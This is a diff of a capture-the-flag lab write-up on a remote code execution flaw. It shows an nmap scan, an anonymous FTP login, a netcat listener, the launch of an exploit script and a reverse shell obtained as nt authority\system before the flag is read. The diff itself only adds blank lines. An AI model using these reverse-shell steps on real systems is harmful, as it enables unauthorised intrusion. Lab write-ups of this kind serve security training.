@@ -40,6 +40,7 @@ This lab demonstrates exploiting a remote code execution vulnerability in Smarte
 - NMap scan
 
 ```bash
+
 nmap -A 192.168.53.65
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 09:10 UTC
 Nmap scan report for 192.168.53.65
@@ -106,6 +107,7 @@ Nmap done: 1 IP address (1 host up) scanned in 37.88 seconds
 - Anonymous FTP login is enabled, allowing unauthenticated access.
 
 ```bash
+
 ftp 192.168.53.65
 Connected to 192.168.53.65.
 220 Microsoft FTP Service
@@ -139,17 +141,21 @@ Remote system type is Windows_NT.
 - Then we need to start a netcat listener to get reverse shell.
 
 ```bash
+
 nc -lvnp 4444
 ```
 
 - After starting the listener, we can execute the exploit to get reverse shell.
 
 ```bash
+
 python3 49216
 ```
+
 - We will get the shell in our netcat listener as **Administrator**
 
 ```bash
+
 nc -lvnp 4444 
 listening on [any] 4444 ...
 connect to [192.168.49.53] from (UNKNOWN) [192.168.53.65] 49906
@@ -158,6 +164,7 @@ PS C:\Windows\system32> whoami
 nt authority\system
 PS C:\Windows\system32> 
 ```
+
 ---
 
 ## Flag Extraction
@@ -165,6 +172,7 @@ PS C:\Windows\system32>
 - Now we can just navigate to **C:\Users\Administrator\Desktop** and read the flag inside **proof.txt** file.
 
 ```bash
+
 PS C:\Users\Administrator\Desktop> ls
 
 
